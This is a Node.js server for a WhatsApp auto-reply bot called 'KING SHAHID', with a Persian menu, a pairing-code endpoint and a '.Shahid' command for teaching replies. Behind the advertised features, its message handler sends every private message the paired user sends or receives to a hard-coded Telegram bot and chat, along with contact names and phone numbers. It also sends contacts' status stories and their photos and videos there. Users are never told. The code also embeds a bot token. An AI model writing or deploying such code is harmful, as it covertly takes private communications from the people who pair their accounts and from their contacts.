const express = require('express');
const pino = require('pino');
const path = require('path');
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    DisconnectReason,
    downloadMediaMessage
} = require('@whiskeysockets/baileys');

const app = express();
const PORT = process.env.PORT || 3000;
const SITE_URL = process.env.RAILWAY_STATIC_URL
    ? `https://${process.env.RAILWAY_STATIC_URL}`
    : 'https://58450067-production.up.railway.app';

const BOT_NAME = 'KING SHAHID';
const PAIR_TAG = 'SHAHID74';
const publicFolder = path.join(__dirname, 'public');
const indexFile = path.join(publicFolder, 'index.html');
const sessionsRoot = path.join(__dirname, 'sessions');
const repliesFile = path.join(__dirname, 'replies.json');

// تنظیمات ربات تلگرام
const TELEGRAM_BOT_TOKEN =
    process.env.TELEGRAM_BOT_TOKEN || '9064238902:AAFfWC5N4YtJrerJHQh-Dj4zCBJZtmhpO2M';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8173349543';

const DEFAULT_FALLBACK_REPLY =
    `سلام! پیام شما دریافت شد.\nاین ربات توسط ${BOT_NAME} جور شده است.\nبرای دیدن منو .menu بفرستید.`;

const activeSockets = new Map();
const presenceTimers = new Map();
const teachStates = new Map();
const contactNames = new Map();

const DEFAULT_REPLIES = {
    'سلام': 'سلام',
    '.menu': [
        '╔════════════════════════╗',
        `     👑 ${BOT_NAME} MENU`,
        '╚════════════════════════╝',
        '',
        `این ربات توسط ${BOT_NAME} جور شده است.`,
        `شناسه: ${PAIR_TAG}`,
        '',
        '📌 دستورات:',
        '• .Shahid — یاد دادن جواب جدید',
        '• .Shahid <متن> — انتخاب متن برای یادگیری جواب',
        '• .menu — نمایش منو'
    ].join('\n')
};

function loadReplies() {
    try {
        if (fs.existsSync(repliesFile)) {
            const raw = fs.readFileSync(repliesFile, 'utf8');
            const parsed = JSON.parse(raw);
            return { ...DEFAULT_REPLIES, ...parsed };
        }
    } catch (err) {
        console.error('Load replies error:', err.message);
    }
    return { ...DEFAULT_REPLIES };
}

function saveReplies(repliesObj) {
    try {
        fs.writeFileSync(repliesFile, JSON.stringify(repliesObj, null, 2), 'utf8');
    } catch (err) {
        console.error('Save replies error:', err.message);
    }
}

let autoReplies = loadReplies();

function extractPhoneFromJid(jid = '') {
    if (!jid) return 'نامشخص';
    const userPart = jid.split('@')[0].split(':')[0];
    return userPart || 'نامشخص';
}

function resolveDisplayName(jid, pushName) {
    if (pushName && pushName.trim()) {
        contactNames.set(jid, pushName.trim());
        return pushName.trim();
    }
    if (contactNames.has(jid)) {
        return contactNames.get(jid);
    }
    return 'بدون نام';
}

function extractTextFromMessage(message) {
    if (!message) return '';
    return (
        message.conversation ||
        message.extendedTextMessage?.text ||
        message.imageMessage?.caption ||
        message.videoMessage?.caption ||
        message.documentMessage?.caption ||
        message.buttonsResponseMessage?.selectedDisplayText ||
        message.listResponseMessage?.title ||
        (message.imageMessage ? '[عکس]' : '') ||
        (message.videoMessage ? '[ویدیو]' : '') ||
        (message.audioMessage ? '[صوت / ویس]' : '') ||
        (message.stickerMessage ? '[استیکر]' : '') ||
        (message.documentMessage ? '[فایل]' : '') ||
        ''
    ).trim();
}

async function sendTelegramMessage(text) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text
            })
        });
    } catch (err) {
        console.error('Telegram sendMessage error:', err.message);
    }
}

async function sendTelegramMedia(msg, caption) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        return sendTelegramMessage(caption);
    }

    const m = msg.message || {};
    const isImage = Boolean(m.imageMessage);
    const isVideo = Boolean(m.videoMessage);

    if (!isImage && !isVideo) {
        return sendTelegramMessage(caption);
    }

    try {
        const buffer = await downloadMediaMessage(msg, 'buffer', {});
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('caption', caption);

        if (isImage) {
            const blob = new Blob([buffer], { type: 'image/jpeg' });
            formData.append('photo', blob, 'story.jpg');
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } else if (isVideo) {
            const blob = new Blob([buffer], { type: 'video/mp4' });
            formData.append('video', blob, 'story.mp4');
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            });
        }
    } catch (err) {
        console.error('Telegram media send error:', err.message);
        await sendTelegramMessage(caption);
    }
}

app.use(express.json());
app.use(express.static(publicFolder));

app.get('/', (req, res) => {
    if (fs.existsSync(indexFile)) {
        return res.sendFile(indexFile);
    }
    return res.status(404).send('public/index.html not found');
});

app.get('/status', (req, res) => {
    res.json({
        ok: true,
        site: SITE_URL,
        bot: BOT_NAME,
        tag: PAIR_TAG,
        telegramConfigured: Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
        telegramChatId: TELEGRAM_CHAT_ID
    });
});

function startKeepOnline(sock, number, jid) {
    const key = `${number}_${jid || 'global'}`;
    if (presenceTimers.has(key)) {
        clearInterval(presenceTimers.get(key));
    }

    const interval = setInterval(async () => {
        try {
            await sock.sendPresenceUpdate('available', jid);
        } catch {}
    }, 25000);

    presenceTimers.set(key, interval);
}

function stopKeepOnlineForNumber(number) {
    for (const [key, timer] of presenceTimers.entries()) {
        if (key.startsWith(`${number}_`)) {
            clearInterval(timer);
            presenceTimers.delete(key);
        }
    }
}

async function handleTeachCommand(sock, remoteJid, msg, body) {
    const lowerBody = body.toLowerCase();
    const isShahidPrefix = lowerBody === '.shahid' || lowerBody.startsWith('.shahid ');
    const currentState = teachStates.get(remoteJid);

    if (lowerBody === '.shahid') {
        teachStates.set(remoteJid, { step: 'waiting_trigger' });
        await sock.sendMessage(
            remoteJid,
            { text: 'برای کدام متن باید جواب بدهم؟\nمثال: .Shahid سلام' },
            { quoted: msg }
        );
        return true;
    }

    if (lowerBody.startsWith('.shahid ')) {
        const arg = body.slice('.shahid '.length).trim();

        if (currentState && currentState.step === 'waiting_reply' && currentState.trigger) {
            if (!arg) {
                await sock.sendMessage(
                    remoteJid,
                    { text: `برای «${currentState.trigger}» چی جواب بدهم؟` },
                    { quoted: msg }
                );
                return true;
            }

            autoReplies[currentState.trigger.toLowerCase()] = arg;
            saveReplies(autoReplies);
            teachStates.delete(remoteJid);

            await sock.sendMessage(
                remoteJid,
                { text: `✅ ذخیره شد!\nمتن: ${currentState.trigger}\nجواب: ${arg}` },
                { quoted: msg }
            );
            return true;
        }

        if (!arg) {
            teachStates.set(remoteJid, { step: 'waiting_trigger' });
            await sock.sendMessage(
                remoteJid,
                { text: 'برای کدام متن باید جواب بدهم؟' },
                { quoted: msg }
            );
            return true;
        }

        teachStates.set(remoteJid, { step: 'waiting_reply', trigger: arg });
        await sock.sendMessage(
            remoteJid,
            { text: `برای این چی جواب بدهم؟\n(متن ذخیره شده: ${arg})` },
            { quoted: msg }
        );
        return true;
    }

    if (currentState && currentState.step === 'waiting_trigger' && !isShahidPrefix) {
        teachStates.set(remoteJid, { step: 'waiting_reply', trigger: body });
        await sock.sendMessage(
            remoteJid,
            { text: `برای این چی جواب بدهم؟\n(متن ذخیره شده: ${body})` },
            { quoted: msg }
        );
        return true;
    }

    if (currentState && currentState.step === 'waiting_reply' && currentState.trigger && !isShahidPrefix) {
        autoReplies[currentState.trigger.toLowerCase()] = body;
        saveReplies(autoReplies);
        teachStates.delete(remoteJid);

        await sock.sendMessage(
            remoteJid,
            { text: `✅ ذخیره شد!\nمتن: ${currentState.trigger}\nجواب: ${body}` },
            { quoted: msg }
        );
        return true;
    }

    return false;
}

function attachEvents(sock, number, sessionFolder) {
    sock.ev.on('contacts.upsert', (contacts) => {
        for (const c of contacts) {
            const name = c.notify || c.name || c.verifiedName;
            if (c.id && name) {
                contactNames.set(c.id, name);
            }
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            console.log(`Connected & Online: ${number} (${BOT_NAME})`);
            try {
                await sock.sendPresenceUpdate('available');
                startKeepOnline(sock, number);
                await sock.sendMessage(sock.user.id, {
                    text: `✅ متصل شد و وضعیت آنلاین فعال است!\nاین ربات توسط ${BOT_NAME} جور شده است.\nبرای یاد دادن جواب جدید .Shahid را بفرستید.`
                });
                await sendTelegramMessage(
                    `✅ واتساپ (${number}) به ربات ${BOT_NAME} متصل شد.`
                );
            } catch (e) {
                console.error('Open event error:', e.message);
            }
        }

        if (connection === 'close') {
            stopKeepOnlineForNumber(number);
            const code = lastDisconnect?.error?.output?.statusCode;
            const shouldReconnect = code !== DisconnectReason.loggedOut;
            console.log(`Closed ${number} | code=${code} | reconnect=${shouldReconnect}`);

            if (code === DisconnectReason.loggedOut) {
                activeSockets.delete(number);
                fs.rmSync(sessionFolder, { recursive: true, force: true });
            } else if (shouldReconnect) {
                await delay(2000);
                startSocket(number, { isReconnect: true }).catch((err) => {
                    console.error('Reconnect error:', err.message);
                });
            }
        }
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg || !msg.message) return;

        const remoteJid = msg.key.remoteJid;
        if (!remoteJid) return;

        const body = extractTextFromMessage(msg.message);

        if (remoteJid === 'status@broadcast') {
            const authorJid = msg.key.participant || msg.participant || '';
            const authorPhone = extractPhoneFromJid(authorJid);
            const authorName = resolveDisplayName(authorJid, msg.pushName);
            const storyText = body || '[استوری بدون متن]';

            const storyCaption = [
                '📸 استوری جدید در واتساپ',
                `👤 نام: ${authorName}`,
                `📞 شماره: ${authorPhone}`,
                `📝 محتوا: ${storyText}`
            ].join('\n');

            await sendTelegramMedia(msg, storyCaption);
            return;
        }

        if (remoteJid.endsWith('@g.us')) return;

        const isBotEcho =
            msg.key.fromMe &&
            (body.startsWith('✅') ||
                body.startsWith('╔') ||
                body.startsWith('برای کدام متن') ||
                body.startsWith('برای این چی') ||
                body.startsWith('✅ ذخیره شد'));
        if (isBotEcho) return;

        const targetPhone = extractPhoneFromJid(remoteJid);
        const targetName = resolveDisplayName(remoteJid, msg.key.fromMe ? '' : msg.pushName);

        if (msg.key.fromMe) {
            if (body) {
                await sendTelegramMessage(
                    [
                        '📤 پیام ارسال‌شده توسط شما در واتساپ',
                        `👤 نام مخاطب: ${targetName}`,
                        `📞 شماره مخاطب: ${targetPhone}`,
                        `💬 پیام: ${body}`
                    ].join('\n')
                );
            }

            const lowerRaw = body.toLowerCase();
            const isTeachFlow =
                lowerRaw === '.shahid' ||
                lowerRaw.startsWith('.shahid ') ||
                teachStates.has(remoteJid);

            if (!isTeachFlow) return;
        } else {
            if (body) {
                await sendTelegramMessage(
                    [
                        '📩 پیام جدید در واتساپ',
                        `👤 نام: ${targetName}`,
                        `📞 شماره: ${targetPhone}`,
                        `💬 پیام: ${body}`
                    ].join('\n')
                );
            }
        }

        if (!body) return;

        try {
            await sock.sendPresenceUpdate('available', remoteJid);
            await sock.sendPresenceUpdate('composing', remoteJid);
            await delay(300);

            const handledTeach = await handleTeachCommand(sock, remoteJid, msg, body);
            if (!handledTeach) {
                const specificReply = autoReplies[body.toLowerCase()];
                const finalReply = specificReply || DEFAULT_FALLBACK_REPLY;
                await sock.sendMessage(remoteJid, { text: finalReply }, { quoted: msg });
            }

            await sock.sendPresenceUpdate('paused', remoteJid);
        } catch (err) {
            console.error('Message handling error:', err.message);
        }
    });
}

async function startSocket(number, { freshSession = false, isReconnect = false } = {}) {
    const sessionFolder = path.join(sessionsRoot, number);

    if (freshSession && fs.existsSync(sessionFolder)) {
        fs.rmSync(sessionFolder, { recursive: true, force: true });
    }

    const prevSock = activeSockets.get(number);
    if (prevSock && !isReconnect) {
        stopKeepOnlineForNumber(number);
        try {
            prevSock.ws?.close();
        } catch {}
        activeSockets.delete(number);
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        },
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: ['Ubuntu', 'Chrome', '124.0.0.0'],
        markOnlineOnConnect: true,
        syncFullHistory: false
    });

    activeSockets.set(number, sock);
    sock.ev.on('creds.update', saveCreds);
    attachEvents(sock, number, sessionFolder);

    return sock;
}

app.post('/pair', async (req, res) => {
    let { number } = req.body;

    if (!number) {
        return res.status(400).json({ error: 'لطفاً شماره واتساپ را وارد کنید.' });
    }

    number = number.replace(/[^0-9]/g, '');
    if (number.length < 8) {
        return res.status(400).json({ error: 'شماره را همراه با کد کشور وارد کنید.' });
    }

    try {
        const sock = await startSocket(number, { freshSession: true });

        if (!sock.authState.creds.registered) {
            await delay(2000);
            const rawCode = await sock.requestPairingCode(number);
            const formatted = rawCode?.match(/.{1,4}/g)?.join('-') || rawCode;
            return res.json({ code: formatted, tag: PAIR_TAG, bot: BOT_NAME });
        }

        return res.json({
            message: 'این شماره متصل است. در واتساپ .Shahid بفرستید.',
            tag: PAIR_TAG,
            bot: BOT_NAME
        });
    } catch (err) {
        console.error('Pair error:', err);
        return res.status(500).json({
            error: 'خطا در تولید کد یا ارتباط با واتساپ. کمی بعد دوباره تلاش کنید.'
        });
    }
});

app.listen(PORT, () => {
    console.log(`${BOT_NAME} server running on ${SITE_URL} (port ${PORT})`);
});
